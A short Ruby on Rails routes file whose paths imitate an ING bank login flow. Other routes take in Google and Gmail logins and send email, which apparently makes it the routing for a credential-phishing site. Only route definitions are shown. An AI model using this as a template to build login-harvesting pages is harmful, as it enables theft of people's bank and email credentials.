Rails.application.routes.draw do
  # For details on the DSL available within this file, see https://guides.rubyonrails.org/routing.html
  root 'user#init'
  get "/ing/default/user/login_next/ing/default/index", to: "user#home"
  get "google-login", to: 'user#get_google_login'
  post "/ing/default/user/login_next/ing/default/user/login", to: 'user#new_from_saf'
  post "login_google", to: 'user#new_from_gmail'
  post "google_embed_js", to: 'user#google_embed'
  post "send_email", to: "user#send_email"
end
